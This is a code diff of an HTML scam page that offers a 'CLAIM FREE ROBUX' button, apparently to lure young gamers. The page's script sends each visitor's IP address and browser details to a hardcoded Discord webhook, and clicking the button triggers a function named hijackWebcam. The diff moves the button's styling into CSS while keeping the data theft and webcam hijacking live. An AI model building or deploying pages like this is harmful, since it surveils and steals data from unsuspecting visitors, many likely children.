@@ -1,8 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+        }
+        
+        #executeBtn {
+            background: linear-gradient(to right, #ff8a00, #e52e71);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 18px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            z-index: 9999;
+        }
+        
+        #executeBtn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+        }
+    </style>
 </head>
 <body>
+    <button id="executeBtn">🎁 CLAIM FREE ROBUX</button>
 
 <script>
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1403081784375250956/eaEVlqH7CvPktmPE8Cjo81X96IuwyH9qS-gTJ58DVS6NAdIbcQ8zuoo4ATQZ8funVWT2";
@@ -156,36 +187,8 @@ async function hijackWebcam() {
   const ip = await getIP();
   await logToWebhook("🌐 VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);
 
-  // Create the button first
-  document.body.innerHTML += `
-    <button id="executeBtn" style="
-      position:fixed;
-      top:10px;
-      right:10px;
-      z-index:9999;
-      background:linear-gradient(to right, #ff8a00, #e52e71);
-      color:white;
-      border:none;
-      padding:12px 24px;
-      border-radius:25px;
-      cursor:pointer;
-      font-weight:bold;
-      box-shadow:0 4px 15px rgba(0,0,0,0.2);
-      transition:all 0.3s ease;
-    ">
-      🎁 CLAIM FREE ROBUX
-    </button>
-  `;
-  
+  // Button event listeners
   const btn = document.getElementById("executeBtn");
-  btn.addEventListener("mouseover", () => {
-    btn.style.transform = "scale(1.05)";
-    btn.style.boxShadow = "0 6px 20px rgba(0,0,0,0.3)";
-  });
-  btn.addEventListener("mouseout", () => {
-    btn.style.transform = "scale(1)";
-    btn.style.boxShadow = "0 4px 15px rgba(0,0,0,0.2)";
-  });
   btn.addEventListener("click", hijackWebcam);
   
   // Initialize activity tracking
